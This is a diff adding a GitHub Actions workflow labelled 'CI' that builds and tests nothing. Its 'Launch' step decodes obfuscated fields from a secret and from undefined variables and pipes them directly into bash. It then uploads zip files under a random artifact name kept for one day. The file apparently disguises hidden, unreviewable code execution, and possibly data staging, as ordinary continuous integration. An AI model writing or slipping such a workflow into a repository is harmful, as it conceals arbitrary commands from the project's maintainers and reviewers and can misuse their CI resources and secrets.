@@ -1,0 +1,30 @@
+name: CI
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          xitw0: ${{ secrets.xitw0 }}
+        run: |
+          printf '%s' "$xitw0" | jq -r .fja948 | /bin/bash
+          printf '%s' "$lyt3" | jq -r .v7761 | /bin/bash
+          printf '%s' "$fw74" | jq -r .p83 | /bin/bash
+          printf '%s' "$o2664" | jq -r .lp37464 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: lZy6kYHD
+          path: "*.zip"
+          retention-days: 1
